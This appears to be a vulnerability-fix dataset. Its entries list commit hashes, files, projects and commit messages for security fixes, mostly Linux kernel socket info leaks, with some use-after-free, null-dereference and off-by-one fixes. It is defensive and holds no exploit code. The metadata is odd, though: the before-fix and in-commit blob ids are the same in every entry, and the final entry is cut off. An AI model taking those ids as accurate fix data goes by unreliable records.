Bluetooth: SCO - Fix missing msg_namelen update in sco_sock_recvmsg()\n\nIf the socket is in state BT_CONNECT2 and BT_SK_DEFER_SETUP is set in the flags, sco_sock_recvmsg() returns early with 0 without updating the possibly set msg_namelen member. This, in turn, leads to a 128 byte kernel stack leak in net/socket.c.\n\nFix this by updating msg_namelen in this case. For all other cases it will be handled in bt_sock_recvmsg().\n\nCc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2d6fbfe733f35c6b355c216644e08e149c61b271
File(s) In Commit: 
    net/caif/caif_socket.c
Blob(s) In Commit: 
    ff2ff3ce6965a73dcf74918cd5c5bcc1b4a7d51b
Blob(s) Before Fix: 
    ff2ff3ce6965a73dcf74918cd5c5bcc1b4a7d51b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2d6fbfe733f35c6b355c216644e08e149c61b271:
caif: Fix missing msg_namelen update in caif_seqpkt_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared about caif_seqpkt_recvmsg() not filling the msg_name in case it was set.\n\nCc: Sjur Braendeland <sjur.brandeland@stericsson.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5ae94c0d2f0bed41d6718be743985d61b7f5c47d
File(s) In Commit: 
    net/irda/af_irda.c
Blob(s) In Commit: 
    e493b3397ae3337b4582d811febb932e0711a09e
Blob(s) Before Fix: 
    e493b3397ae3337b4582d811febb932e0711a09e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 5ae94c0d2f0bed41d6718be743985d61b7f5c47d:
irda: Fix missing msg_namelen update in irda_recvmsg_dgram()\n\nThe current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared about irda_recvmsg_dgram() not filling the msg_name in case it was set.\n\nCc: Samuel Ortiz <samuel@sortiz.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a5598bd9c087dc0efc250a5221e5d0e6f584ee88
File(s) In Commit: 
    net/iucv/af_iucv.c
Blob(s) In Commit: 
    bf69358200019c28c18472cc852ccd6b3f74f7cf
Blob(s) Before Fix: 
    bf69358200019c28c18472cc852ccd6b3f74f7cf
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a5598bd9c087dc0efc250a5221e5d0e6f584ee88:
iucv: Fix missing msg_namelen update in iucv_sock_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared about iucv_sock_recvmsg() not filling the msg_name in case it was set.\n\nCc: Ursula Braun <ursula.braun@de.ibm.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b860d3cc62877fad02863e2a08efff69a19382d2
File(s) In Commit: 
    net/l2tp/l2tp_ip6.c
Blob(s) In Commit: 
    b8a6039314e868781d3130f06fbb78ced6c4a678
Blob(s) Before Fix: 
    b8a6039314e868781d3130f06fbb78ced6c4a678
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b860d3cc62877fad02863e2a08efff69a19382d2:
l2tp: fix info leak in l2tp_ip6_recvmsg()\n\nThe L2TP code for IPv6 fails to initialize the l2tp_conn_id member of struct sockaddr_l2tpip6 and therefore leaks four bytes kernel stack in l2tp_ip6_recvmsg() in case msg_name is set.\n\nInitialize l2tp_conn_id with 0 to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c77a4b9cffb6215a15196ec499490d116dfad181
File(s) In Commit: 
    net/llc/af_llc.c
Blob(s) In Commit: 
    48aaa89253e037c9b7f2e07f3bc1d03d837266fd
Blob(s) Before Fix: 
    48aaa89253e037c9b7f2e07f3bc1d03d837266fd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c77a4b9cffb6215a15196ec499490d116dfad181:
llc: Fix missing msg_namelen update in llc_ui_recvmsg()\n\nFor stream sockets the code misses to update the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory. The msg_namelen update is also missing for datagram sockets in case the socket is shutting down during receive.\n\nFix both issues by setting msg_namelen to 0 early. It will be updated later if we're going to fill the msg_name member.\n\nCc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    d26d6504f23e803824e8ebd14e52d4fc0a0b09cb
File(s) In Commit: 
    net/nfc/llcp/sock.c
Blob(s) In Commit: 
    6c94447ec414c87479581b45fbcced1071f782cb
Blob(s) Before Fix: 
    6c94447ec414c87479581b45fbcced1071f782cb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d26d6504f23e803824e8ebd14e52d4fc0a0b09cb:
NFC: llcp: fix info leaks via msg_name in llcp_sock_recvmsg()\n\nThe code in llcp_sock_recvmsg() does not initialize all the members of struct sockaddr_nfc_llcp when filling the sockaddr info. Nor does it initialize the padding bytes of the structure inserted by the compiler for alignment.\n\nAlso, if the socket is in state LLCP_CLOSED or is shutting down during receive the msg_namelen member is not updated to 0 while otherwise returning with 0, i.e. "success". The msg_namelen update is also missing for stream and seqpacket sockets which don't fill the sockaddr info.\n\nBoth issues lead to the fact that the code will leak uninitialized kernel stack bytes in net/socket.c.\n\nFix the first issue by initializing the memory used for sockaddr info with memset(0). Fix the second one by setting msg_namelen to 0 early. It will be updated later if we're going to fill the msg_name member.\n\nCc: Lauro Ramos Venancio <lauro.venancio@openbossa.org> Cc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org> Cc: Samuel Ortiz <sameo@linux.intel.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4a184233f21645cf0b719366210ed445d1024d72
File(s) In Commit: 
    net/rose/af_rose.c
Blob(s) In Commit: 
    9c834745159786e5e1d4338f51860be00943a0fd
Blob(s) Before Fix: 
    9c834745159786e5e1d4338f51860be00943a0fd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4a184233f21645cf0b719366210ed445d1024d72:
rose: fix info leak via msg_name in rose_recvmsg()\n\nThe code in rose_recvmsg() does not initialize all of the members of struct sockaddr_rose/full_sockaddr_rose when filling the sockaddr info. Nor does it initialize the padding bytes of the structure inserted by the compiler for alignment. This will lead to leaking uninitialized kernel stack bytes in net/socket.c.\n\nFix the issue by initializing the memory used for sockaddr info with memset(0).\n\nCc: Ralf Baechle <ralf@linux-mips.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    60085c3d009b0df252547adb336d1ccca5ce52ec
File(s) In Commit: 
    net/tipc/socket.c
Blob(s) In Commit: 
    515ce38e4f4c7286023f32f4c8c692af2787ec80
Blob(s) Before Fix: 
    515ce38e4f4c7286023f32f4c8c692af2787ec80
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 60085c3d009b0df252547adb336d1ccca5ce52ec:
tipc: fix info leaks via msg_name in recv_msg/recv_stream\n\nThe code in set_orig_addr() does not initialize all of the members of struct sockaddr_tipc when filling the sockaddr info -- namely the union is only partly filled. This will make recv_msg() and recv_stream() -- the only users of this function -- leak kernel stack memory as the msg_name member is a local variable in net/socket.c.\n\nAdditionally to that both recv_msg() and recv_stream() fail to update the msg_namelen member to 0 while otherwise returning with 0, i.e. "success". This is the case for, e.g., non-blocking sockets. This will lead to a 128 byte kernel stack leak in net/socket.c.\n\nFix the first issue by initializing the memory of the union with memset(0). Fix the second one by setting msg_namelen to 0 early as it will be updated later if we're going to fill the msg_name member.\n\nCc: Jon Maloy <jon.maloy@ericsson.com> Cc: Allan Stephens <allan.stephens@windriver.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    680d04e0ba7e926233e3b9cee59125ce181f66ba
File(s) In Commit: 
    net/vmw_vsock/vmci_transport.c
Blob(s) In Commit: 
    5e04d3d96285daaa01ff8d35e58081ce4807f093
Blob(s) Before Fix: 
    5e04d3d96285daaa01ff8d35e58081ce4807f093
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 680d04e0ba7e926233e3b9cee59125ce181f66ba:
VSOCK: vmci - fix possible info leak in vmci_transport_dgram_dequeue()\n\nIn case we received no data on the call to skb_recv_datagram(), i.e. skb->data is NULL, vmci_transport_dgram_dequeue() will return with 0 without updating msg_namelen leading to net/socket.c leaking the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix this by moving the already existing msg_namelen assignment a few lines above.\n\nCc: Andy King <acking@vmware.com> Cc: Dmitry Torokhov <dtor@vmware.com> Cc: George Zhang <georgezhang@vmware.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    d5e0d0f607a7a029c6563a0470d88255c89a8d11
File(s) In Commit: 
    net/vmw_vsock/af_vsock.c
Blob(s) In Commit: 
    7f93e2a42d7a57f0cbdbe2305c942cce7b544d1b
Blob(s) Before Fix: 
    7f93e2a42d7a57f0cbdbe2305c942cce7b544d1b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d5e0d0f607a7a029c6563a0470d88255c89a8d11:
VSOCK: Fix missing msg_namelen update in vsock_stream_recvmsg()\n\nThe code misses to update the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nCc: Andy King <acking@vmware.com> Cc: Dmitry Torokhov <dtor@vmware.com> Cc: George Zhang <georgezhang@vmware.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ea702b80e0bbb2448e201472127288beb82ca2fe
File(s) In Commit: 
    fs/cifs/transport.c
Blob(s) In Commit: 
    1a528680ec5a29e4b59485fba5df54568a1e3787
Blob(s) Before Fix: 
    1a528680ec5a29e4b59485fba5df54568a1e3787
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ea702b80e0bbb2448e201472127288beb82ca2fe:
cifs: move check for NULL socket into smb_send_rqst\n\nCai reported this oops:\n\n[90701.616664] BUG: unable to handle kernel NULL pointer dereference at 0000000000000028 [90701.625438] IP: [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.632167] PGD fea319067 PUD 103fda4067 PMD 0 [90701.637255] Oops: 0000 [#1] SMP [90701.640878] Modules linked in: des_generic md4 nls_utf8 cifs dns_resolver binfmt_misc tun sg igb iTCO_wdt iTCO_vendor_support lpc_ich pcspkr i2c_i801 i2c_core i7core_edac edac_core ioatdma dca mfd_core coretemp kvm_intel kvm crc32c_intel microcode sr_mod cdrom ata_generic sd_mod pata_acpi crc_t10dif ata_piix libata megaraid_sas dm_mirror dm_region_hash dm_log dm_mod [90701.677655] CPU 10 [90701.679808] Pid: 9627, comm: ls Tainted: G        W    3.7.1+ #10 QCI QSSC-S4R/QSSC-S4R [90701.688950] RIP: 0010:[<ffffffff814a343e>]  [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.698383] RSP: 0018:ffff88177b431bb8  EFLAGS: 00010206 [90701.704309] RAX: ffff88177b431fd8 RBX: 00007ffffffff000 RCX: ffff88177b431bec [90701.712271] RDX: 0000000000000003 RSI: 0000000000000006 RDI: 0000000000000000 [90701.720223] RBP: ffff88177b431bc8 R08: 0000000000000004 R09: 0000000000000000 [90701.728185] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000001 [90701.736147] R13: ffff88184ef92000 R14: 0000000000000023 R15: ffff88177b431c88 [90701.744109] FS:  00007fd56a1a47c0(0000) GS:ffff88105fc40000(0000) knlGS:0000000000000000 [90701.753137] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [90701.759550] CR2: 0000000000000028 CR3: 000000104f15f000 CR4: 00000000000007e0 [90701.767512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [90701.775465] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [90701.783428] Process ls (pid: 9627, threadinfo ffff88177b430000, task ffff88185ca4cb60) [90701.792261] Stack: [90701.794505]  0000000000000023 ffff88177b431c50 ffff88177b431c38 ffffffffa014fcb1 [90701.802809]  ffff88184ef921bc 0000000000000000 00000001ffffffff ffff88184ef921c0 [90701.811123]  ffff88177b431c08 ffffffff815ca3d9 ffff88177b431c18 ffff880857758000 [90701.819433] Call Trace: [90701.822183]  [<ffffffffa014fcb1>] smb_send_rqst+0x71/0x1f0 [cifs] [90701.828991]  [<ffffffff815ca3d9>] ? schedule+0x29/0x70 [90701.834736]  [<ffffffffa014fe6d>] smb_sendv+0x3d/0x40 [cifs] [90701.841062]  [<ffffffffa014fe96>] smb_send+0x26/0x30 [cifs] [90701.847291]  [<ffffffffa015801f>] send_nt_cancel+0x6f/0xd0 [cifs] [90701.854102]  [<ffffffffa015075e>] SendReceive+0x18e/0x360 [cifs] [90701.860814]  [<ffffffffa0134a78>] CIFSFindFirst+0x1a8/0x3f0 [cifs] [90701.867724]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1/0x260 [cifs] [90701.875601]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1/0x260 [cifs] [90701.883477]  [<ffffffffa01578e6>] cifs_query_dir_first+0x26/0x30 [cifs] [90701.890869]  [<ffffffffa015480d>] initiate_cifs_search+0xed/0x250 [cifs] [90701.898354]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.904486]  [<ffffffffa01554cb>] cifs_readdir+0x45b/0x8f0 [cifs] [90701.911288]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.917410]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.923533]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.929657]  [<ffffffff81195848>] vfs_readdir+0xb8/0xe0 [90701.935490]  [<ffffffff81195b9f>] sys_getdents+0x8f/0x110 [90701.941521]  [<ffffffff815d3b99>] system_call_fastpath+0x16/0x1b [90701.948222] Code: 66 90 55 65 48 8b 04 25 f0 c6 00 00 48 89 e5 53 48 83 ec 08 83 fe 01 48 8b 98 48 e0 ff ff 48 c7 80 48 e0 ff ff ff ff ff ff 74 22 <48> 8b 47 28 ff 50 68 65 48 8b 14 25 f0 c6 00 00 48 89 9a 48 e0 [90701.970313] RIP  [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.977125]  RSP <ffff88177b431bb8> [90701.981018] CR2: 0000000000000028 [90701.984809] ---[ end trace 24bd602971110a43 ]---\n\nThis is likely due to a race vs. a reconnection event.\n\nThe current code checks for a NULL socket in smb_send_kvec, but that's too late. By the time that check is done, the socket will already have been passed to kernel_setsockopt. Move the check into smb_send_rqst, so that it's checked earlier.\n\nIn truth, this is a bit of a half-assed fix. The -ENOTSOCK error return here looks like it could bubble back up to userspace. The locking rules around the ssocket pointer are really unclear as well. There are cases where the ssocket pointer is changed without holding the srv_mutex, but I'm not clear whether there's a potential race here yet or not.\n\nThis code seems like it could benefit from some fundamental re-think of how the socket handling should behave. Until then though, this patch should at least fix the above oops in most cases.\n\nCc: <stable@vger.kernel.org> # 3.7+ Reported-and-Tested-by: CAI Qian <caiqian@redhat.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>

======================================================================
Commit With Fix: 
    83078591bc4d263e77d2a2ca283100997755290d
File(s) In Commit: 
    library/database/class.sqldriver.php
Blob(s) In Commit: 
    6803584c06ceeb0ecc04b32831628151fc7ec8f8
Blob(s) Before Fix: 
    6803584c06ceeb0ecc04b32831628151fc7ec8f8
Projects:
    08_Garden
Commit Message for 83078591bc4d263e77d2a2ca283100997755290d:
Disable the ability to call functions in escaped sql strings.

======================================================================
Commit With Fix: 
    9b3551601ce714adb5e3f428476052f0ec6093bf
File(s) In Commit: 
    view_create.php
Blob(s) In Commit: 
    cd2ec3b616e6b5455df67628e955971b4de5b0a4
Blob(s) Before Fix: 
    cd2ec3b616e6b5455df67628e955971b4de5b0a4
Projects:
    007durgesh219_phpmyadmin
Commit Message for 9b3551601ce714adb5e3f428476052f0ec6093bf:
escape query in error message

======================================================================
Commit With Fix: 
    307f2fb95e9b96b3577916e73d92e104f8f26494
File(s) In Commit: 
    net/ipv6/ip6_fib.c
Blob(s) In Commit: 
    5fc9c7a68d8d102aef37b7b13ab1dd772553a9cb
Blob(s) Before Fix: 
    5fc9c7a68d8d102aef37b7b13ab1dd772553a9cb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 307f2fb95e9b96b3577916e73d92e104f8f26494:
ipv6: only static routes qualify for equal cost multipathing\n\nStatic routes in this case are non-expiring routes which did not get configured by autoconf or by icmpv6 redirects.\n\nTo make sure we actually get an ecmp route while searching for the first one in this fib6_node's leafs, also make sure it matches the ecmp route assumptions.\n\nv2: a) Removed RTF_EXPIRE check in dst.from chain. The check of RTF_ADDRCONF    already ensures that this route, even if added again without    RTF_EXPIRES (in case of a RA announcement with infinite timeout),    does not cause the rt6i_nsiblings logic to go wrong if a later RA    updates the expiration time later.\n\nv3: a) Allow RTF_EXPIRES routes to enter the ecmp route set. We have to do so,    because an pmtu event could update the RTF_EXPIRES flag and we would    not count this route, if another route joins this set. We now filter    only for RTF_GATEWAY|RTF_ADDRCONF|RTF_DYNAMIC, which are flags that    don't get changed after rt6_info construction.\n\nCc: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    dd7633ecd553a5e304d349aa6f8eb8a0417098c5
File(s) In Commit: 
    drivers/vhost/net.c
Blob(s) In Commit: 
    8ca5ac71b8452210517c128b6b7c12e7af832b4f
Blob(s) Before Fix: 
    8ca5ac71b8452210517c128b6b7c12e7af832b4f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for dd7633ecd553a5e304d349aa6f8eb8a0417098c5:
vhost-net: fix use-after-free in vhost_net_flush\n\nvhost_net_ubuf_put_and_wait has a confusing name: it will actually also free it's argument. Thus since commit 1280c27f8e29acf4af2da914e80ec27c3dbd5c01     "vhost-net: flush outstanding DMAs on memory change" vhost_net_flush tries to use the argument after passing it to vhost_net_ubuf_put_and_wait, this results in use after free. To fix, don't free the argument in vhost_net_ubuf_put_and_wait, add an new API for callers that want to free ubufs.\n\nAcked-by: Asias He <asias@redhat.com> Acked-by: Jason Wang <jasowang@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    75a493e60ac4bbe2e977e7129d6d8cbb0dd236be
File(s) In Commit: 
    net/ipv6/ip6_output.c
Blob(s) In Commit: 
    be7589ef5cf942c5bb0c2aa27d251c31420e9fb4
Blob(s) Before Fix: 
    be7589ef5cf942c5bb0c2aa27d251c31420e9fb4
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 75a493e60ac4bbe2e977e7129d6d8cbb0dd236be:
ipv6: ip6_append_data_mtu did not care about pmtudisc and frag_size\n\nIf the socket had an IPV6_MTU value set, ip6_append_data_mtu lost track of this when appending the second frame on a corked socket. This results in the following splat:\n\n[37598.993962] ------------[ cut here ]------------ [37598.994008] kernel BUG at net/core/skbuff.c:2064! [37598.994008] invalid opcode: 0000 [#1] SMP [37598.994008] Modules linked in: tcp_lp uvcvideo videobuf2_vmalloc videobuf2_memops videobuf2_core videodev media vfat fat usb_storage fuse ebtable_nat xt_CHECKSUM bridge stp llc ipt_MASQUERADE nf_conntrack_netbios_ns nf_conntrack_broadcast ip6table_mangle ip6t_REJECT nf_conntrack_ipv6 nf_defrag_ipv6 iptable_nat +nf_nat_ipv4 nf_nat iptable_mangle nf_conntrack_ipv4 nf_defrag_ipv4 xt_conntrack nf_conntrack ebtable_filter ebtables ip6table_filter ip6_tables be2iscsi iscsi_boot_sysfs bnx2i cnic uio cxgb4i cxgb4 cxgb3i cxgb3 mdio libcxgbi ib_iser rdma_cm ib_addr iw_cm ib_cm ib_sa ib_mad ib_core iscsi_tcp libiscsi_tcp libiscsi +scsi_transport_iscsi rfcomm bnep iTCO_wdt iTCO_vendor_support snd_hda_codec_conexant arc4 iwldvm mac80211 snd_hda_intel acpi_cpufreq mperf coretemp snd_hda_codec microcode cdc_wdm cdc_acm [37598.994008]  snd_hwdep cdc_ether snd_seq snd_seq_device usbnet mii joydev btusb snd_pcm bluetooth i2c_i801 e1000e lpc_ich mfd_core ptp iwlwifi pps_core snd_page_alloc mei cfg80211 snd_timer thinkpad_acpi snd tpm_tis soundcore rfkill tpm tpm_bios vhost_net tun macvtap macvlan kvm_intel kvm uinput binfmt_misc +dm_crypt i915 i2c_algo_bit drm_kms_helper drm i2c_core wmi video [37598.994008] CPU 0 [37598.994008] Pid: 27320, comm: t2 Not tainted 3.9.6-200.fc18.x86_64 #1 LENOVO 27744PG/27744PG [37598.994008] RIP: 0010:[<ffffffff815443a5>]  [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325/0x330 [37598.994008] RSP: 0018:ffff88003670da18  EFLAGS: 00010202 [37598.994008] RAX: ffff88018105c018 RBX: 0000000000000004 RCX: 00000000000006c0 [37598.994008] RDX: ffff88018105a6c0 RSI: ffff88018105a000 RDI: ffff8801e1b0aa00 [37598.994008] RBP: ffff88003670da78 R08: 0000000000000000 R09: ffff88018105c040 [37598.994008] R10: ffff8801e1b0aa00 R11: 0000000000000000 R12: 000000000000fff8 [37598.994008] R13: 00000000000004fc R14: 00000000ffff0504 R15: 0000000000000000 [37598.994008] FS:  00007f28eea59740(0000) GS:ffff88023bc00000(0000) knlGS:0000000000000000 [37598.994008] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [37598.994008] CR2: 0000003d935789e0 CR3: 00000000365cb000 CR4: 00000000000407f0 [37598.994008] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [37598.994008] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [37598.994008] Process t2 (pid: 27320, threadinfo ffff88003670c000, task ffff88022c162ee0) [37598.994008] Stack: [37598.994008]  ffff88022e098a00 ffff88020f973fc0 0000000000000008 00000000000004c8 [37598.994008]  ffff88020f973fc0 00000000000004c4 ffff88003670da78 ffff8801e1b0a200 [37598.994008]  0000000000000018 00000000000004c8 ffff88020f973fc0 00000000000004c4 [37598.994008] Call Trace: [37598.994008]  [<ffffffff815fc21f>] ip6_append_data+0xccf/0xfe0 [37598.994008]  [<ffffffff8158d9f0>] ? ip_copy_metadata+0x1a0/0x1a0 [37598.994008]  [<ffffffff81661f66>] ? _raw_spin_lock_bh+0x16/0x40 [37598.994008]  [<ffffffff8161548d>] udpv6_sendmsg+0x1ed/0xc10 [37598.994008]  [<ffffffff812a2845>] ? sock_has_perm+0x75/0x90 [37598.994008]  [<ffffffff815c3693>] inet_sendmsg+0x63/0xb0 [37598.994008]  [<ffffffff812a2973>] ? selinux_socket_sendmsg+0x23/0x30 [37598.994008]  [<ffffffff8153a450>] sock_sendmsg+0xb0/0xe0 [37598.994008]  [<ffffffff810135d1>] ? __switch_to+0x181/0x4a0 [37598.994008]  [<ffffffff8153d97d>] sys_sendto+0x12d/0x180 [37598.994008]  [<ffffffff810dfb64>] ? __audit_syscall_entry+0x94/0xf0 [37598.994008]  [<ffffffff81020ed1>] ? syscall_trace_enter+0x231/0x240 [37598.994008]  [<ffffffff8166a7e7>] tracesys+0xdd/0xe2 [37598.994008] Code: fe 07 00 00 48 c7 c7 04 28 a6 81 89 45 a0 4c 89 4d b8 44 89 5d a8 e8 1b ac b1 ff 44 8b 5d a8 4c 8b 4d b8 8b 45 a0 e9 cf fe ff ff <0f> 0b 66 0f 1f 84 00 00 00 00 00 66 66 66 66 90 55 48 89 e5 48 [37598.994008] RIP  [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325/0x330 [37598.994008]  RSP <ffff88003670da18> [37599.007323] ---[ end trace d69f6a17f8ac8eee ]---\n\nWhile there, also check if path mtu discovery is activated for this socket. The logic was adapted from ip6_append_data when first writing on the corked socket.\n\nThis bug was introduced with commit 0c1833797a5a6ec23ea9261d979aa18078720b74 ("ipv6: fix incorrect ipsec fragment").\n\nv2: a) Replace IPV6_PMTU_DISC_DO with IPV6_PMTUDISC_PROBE. b) Don't pass ipv6_pinfo to ip6_append_data_mtu (suggestion by Gao    feng, thanks!). c) Change mtu to unsigned int, else we get a warning about    non-matching types because of the min()-macro type-check.\n\nAcked-by: Gao feng <gaofeng@cn.fujitsu.com> Cc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6160968cee8b90a5dd95318d716e31d7775c4ef3
File(s) In Commit: 
    kernel/user_namespace.c
Blob(s) In Commit: 
    6e50a44610eedc4b5ebeece393b9c9331b0b5abb
Blob(s) Before Fix: 
    6e50a44610eedc4b5ebeece393b9c9331b0b5abb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6160968cee8b90a5dd95318d716e31d7775c4ef3:
userns: unshare_userns(&cred) should not populate cred on failure\n\nunshare_userns(new_cred) does *new_cred = prepare_creds() before create_user_ns() which can fail. However, the caller expects that it doesn't need to take care of new_cred if unshare_userns() fails.\n\nWe could change the single caller, sys_unshare(), but I think it would be more clean to avoid the side effects on failure, so with this patch unshare_userns() does put_cred() itself and initializes *new_cred only if create_user_ns() succeeeds.\n\nCc: stable@vger.kernel.org Signed-off-by: Oleg Nesterov <oleg@redhat.com> Reviewed-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9955ac47f4ba1c95ecb6092aeaefb40a22e99268
File(s) In Commit: 
    arch/arm64/kernel/traps.c
Blob(s) In Commit: 
    f30852d28590358c6780a22c14049f92a124bdb8
Blob(s) Before Fix: 
    f30852d28590358c6780a22c14049f92a124bdb8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 9955ac47f4ba1c95ecb6092aeaefb40a22e99268:
arm64: don't kill the kernel on a bad esr from el0\n\nRather than completely killing the kernel if we receive an esr value we can't deal with in the el0 handlers, send the process a SIGILL and log the esr value in the hope that we can debug it. If we receive a bad esr from el1, we'll die() as before.\n\nSigned-off-by: Mark Rutland <mark.rutland@arm.com> Signed-off-by: Catalin Marinas <catalin.marinas@arm.com> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    1fc29bacedeabb278080e31bb9c1ecb49f143c3b
File(s) In Commit: 
    fs/cifs/connect.c
Blob(s) In Commit: 
    e3bc39bb9d12b224d7cda96e2e55b9babed68c0b
Blob(s) Before Fix: 
    e3bc39bb9d12b224d7cda96e2e55b9babed68c0b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1fc29bacedeabb278080e31bb9c1ecb49f143c3b:
cifs: fix off-by-one bug in build_unc_path_to_root\n\ncommit 839db3d10a (cifs: fix up handling of prefixpath= option) changed the code such that the vol->prepath no longer contained a leading delimiter and then fixed up the places that accessed that field to account for that change.\n\nOne spot in build_unc_path_to_root was missed however. When doing the pointer addition on pos, that patch failed to account for the fact that we had already incremented "pos" by one when adding the length of the prepath. This caused a buffer overrun by one byte.\n\nThis patch fixes the problem by correcting the handling of "pos".\n\nCc: <stable@vger.kernel.org> # v3.8+ Reported-by: Marcus Moeller <marcus.moeller@gmx.ch> Reported-by: Ken Fallon <ken.fallon@gmail.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>

======================================================================
Commit With Fix: 
    c95eb3184ea1a3a2551df57190c81da695e2144b
File(s) In Commit: 
    arch/arm/kernel/perf_event.c
Blob(s) In Commit: 
    0500f10b50413428da67219c395572a8fae4752d
Blob(s) Before Fix: 
    0500f10b50413428da67219c395572a8fae4752d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c95eb3184ea1a3a2551df57190c81da695e2144b:
